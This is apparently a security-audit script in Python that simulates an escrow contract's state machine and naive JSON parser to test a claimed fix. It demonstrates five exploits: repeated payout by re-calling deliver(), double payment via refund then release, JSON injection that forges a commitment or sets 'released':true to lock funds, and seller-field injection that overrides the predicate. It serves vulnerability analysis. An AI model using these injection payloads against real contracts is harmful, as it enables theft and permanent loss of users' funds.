"""Faithful re-implementation of assembly/index.ts (pod-4) state machine + parser,
to test whether the claimed 'two independent barriers' actually hold."""

def deal_json(token, buyer, seller, amount, predicate, commitment, deadline, released):
    return ('{"token":"' + token + '","buyer":"' + buyer +
            '","seller":"' + seller + '","amount":"' + amount +
            '","predicate":"' + predicate + '","commitment":"' + commitment +
            '","deadline":' + str(deadline) +
            ',"released":' + ("true" if released else "false") + '}')

def skip_ws(s, i):
    while i < len(s) and s[i] in ' \t\n':
        i += 1
    return i

def value_start(j, key):
    i = j.find('"' + key + '"')
    if i < 0:
        return -1
    i = skip_ws(j, i + len('"' + key + '"'))
    if i >= len(j) or j[i] != ':':
        return -1
    return skip_ws(j, i + 1)

def field(j, key):
    i = value_start(j, key)
    if i < 0 or j[i] != '"':
        return ""
    i += 1
    st = i
    while i < len(j) and j[i] != '"':
        i += 1
    return j[st:i]

def num_field(j, key):
    i = value_start(j, key)
    if i < 0:
        return 0
    if j[i] == '"':
        i += 1
    st = i
    while i < len(j) and j[i].isdigit():
        i += 1
    return int(j[st:i]) if i > st else 0

def bool_field(j, key):
    i = value_start(j, key)
    if i < 0:
        return False
    return j[i:i+4] == "true"

# --- helpers mirroring the contract ---
def layer_commit(p):
    h = 2166136261
    for ch in p:
        h = ((h ^ (ord(ch) & 0xff)) * 16777619) & 0xffffffff
    s = sum((ord(c) & 0xff) + i for i, c in enumerate(p)) % 231
    l = sum((ord(c) & 0xff) * 22 + i for i, c in enumerate(p)) % 231
    o = sum(1 for c in p if (ord(c) & 0xff) & 1) % 37
    return "%08x-%02x-%02x-%02x" % (h, s, l, o)

def digest_for(pred, payload):
    return layer_commit(payload)

def digest_matches(delivered, pred):
    a, b = delivered.split('-'), pred.split('-')
    if len(a) != 4 or len(b) != 4:
        return delivered == pred
    return a == b

class Revert(Exception): pass

class Chain:
    def __init__(self):
        self.deals = {}
        self.payouts = []          # (to, amount)
        self.balance = 0           # contract-held native balance

    def create_deal(self, deal_id, buyer, seller, predicate, deadline, dep, now):
        if deal_id in self.deals: raise Revert("deal exists")
        if dep <= 0: raise Revert("attach a deposit")
        if not (deadline > now): raise Revert("deadline in the past")
        self.deals[deal_id] = deal_json("", buyer, seller, str(dep), predicate, "", deadline, False)
        self.balance += dep

    def deliver(self, deal_id, sender, payload):
        if deal_id not in self.deals: raise Revert("no deal")
        j = self.deals[deal_id]
        if field(j, "seller") != sender: raise Revert("only the seller delivers")
        nc = digest_for(field(j, "predicate"), payload)
        self.deals[deal_id] = deal_json(field(j,"token"), field(j,"buyer"), field(j,"seller"),
                                        field(j,"amount"), field(j,"predicate"), nc,
                                        num_field(j,"deadline"), False)   # <-- released := false
        return nc

    def release(self, deal_id, now):
        if deal_id not in self.deals: raise Revert("no deal")
        j = self.deals[deal_id]
        if bool_field(j, "released"): raise Revert("deal already settled")
        if len(field(j, "commitment")) == 0: raise Revert("nothing delivered")
        if not digest_matches(field(j,"commitment"), field(j,"predicate")):
            raise Revert("delivery does not satisfy the predicate")
        self.deals[deal_id] = deal_json(field(j,"token"), field(j,"buyer"), field(j,"seller"),
                                        field(j,"amount"), field(j,"predicate"), "",
                                        num_field(j,"deadline"), True)
        amt = int(field(j, "amount"))
        self.payouts.append((field(j, "seller"), amt)); self.balance -= amt
        return amt

    def refund(self, deal_id, sender, now):
        if deal_id not in self.deals: raise Revert("no deal")
        j = self.deals[deal_id]
        if field(j, "buyer") != sender: raise Revert("only the buyer refunds")
        if bool_field(j, "released"): raise Revert("deal already settled")
        dl = num_field(j, "deadline")
        if dl == 0 or not (now >= dl): raise Revert("deadline not reached")
        self.deals[deal_id] = deal_json(field(j,"token"), field(j,"buyer"), field(j,"seller"),
                                        field(j,"amount"), field(j,"predicate"), "", dl, True)
        amt = int(field(j, "amount"))
        self.payouts.append((field(j, "buyer"), amt)); self.balance -= amt
        return amt

def hdr(t): print("\n=== %s ===" % t)

# ---- A: the claimed "two independent barriers" vs. deliver() -----------------
hdr("A: deliver() after release - does the pod-4 fix hold?")
c = Chain()
c.create_deal("d1", "buyer.testnet", "seller.testnet", layer_commit("the real artifact"), 10**9, 1000, 1)
c.deliver("d1", "seller.testnet", "the real artifact")
print("release#1 paid:", c.release("d1", 2))
try:
    c.release("d1", 2)
except Revert as e:
    print("release#2 (barrier 1) -> REVERT:", e, "| commitment slot cleared -> barrier 2 armed")
c.deliver("d1", "seller.testnet", "the real artifact")   # <-- resets released=false, refills slot
print("after deliver() again: released =", bool_field(c.deals['d1'], 'released'),
      "| commitment set again =", len(field(c.deals['d1'], 'commitment')) > 0)
total = 0
for i in range(5):
    c.deliver("d1", "seller.testnet", "the real artifact")
    total += c.release("d1", 2)
print("one 1000-unit deal now paid out:", total, "-> payments:", len(c.payouts))
print("contract balance left:", c.balance)

# ---- B: refund THEN deliver THEN release (both sides paid) -------------------
hdr("B: refund() then deliver() then release() - both sides paid")
c = Chain()
c.create_deal("d2", "buyer.testnet", "seller.testnet", layer_commit("art"), 100, 1000, 1)
print("refund to buyer:", c.refund("d2", "buyer.testnet", 200))
print("released after refund:", bool_field(c.deals['d2'], 'released'))
c.deliver("d2", "seller.testnet", "art")
print("seller then releases:", c.release("d2", 200))
print("total paid for one 1000 deposit:", sum(a for _, a in c.payouts))

# ---- C: predicate injection pre-satisfies release (no delivery at all) ------
hdr("C: predicate injection -> release with NO delivery")
c = Chain()
art = "the real artifact"
C0 = layer_commit(art)
# the buyer KNOWS C0 (it is the predicate); inject it as the commitment slot too
inj = C0 + '","commitment":"' + C0 + '","y":"'
c.create_deal("d3", "buyer.testnet", "seller.testnet", inj, 10**9, 1000, 1)
print("stored json:", c.deals['d3'])
print("field(commitment) =", field(c.deals['d3'], "commitment"), "(forged at create time)")
print("release with no deliver() call paid:", c.release("d3", 2))
import json as J
try:
    print("standard JSON parse sees commitment:", repr(J.loads(c.deals['d3']).get('commitment')))
except Exception as e:
    print("standard parser:", e)

# ---- D: released:true injection -> permanent lock (no assert on predicate) --
hdr("D: 'released':true injection -> funds locked forever")
c = Chain()
inj = 'x","released":true,"y":"'
c.create_deal("d4", "buyer.testnet", "seller.testnet", inj, 100, 1000, 1)
print("boolField(released) on a brand-new deal =", bool_field(c.deals['d4'], "released"))
for fn in ("release", "refund"):
    try:
        if fn == "release": c.release("d4", 2)
        else: c.refund("d4", "buyer.testnet", 10**6)
    except Revert as e:
        print("%s -> REVERT: %s" % (fn, e))
print("balance held hostage:", c.balance)

# ---- E: seller injection overrides the predicate the seller must match ------
hdr("E: seller injection overrides predicate/amount (buyer+3rd party view split)")
c = Chain()
c.create_deal("d5", "buyer.testnet",
              'seller.testnet","predicate":"%s","z":"' % layer_commit("garbage"),
              layer_commit("the real artifact"), 10**9, 1000, 1)
print("field(seller)    =", field(c.deals['d5'], "seller"))
print("field(predicate) =", field(c.deals['d5'], "predicate"), "(injected, not the buyer's)")
c.deliver("d5", "seller.testnet", "garbage")
print("release paid:", c.release("d5", 2), "on a payload that is not the buyer's artifact")
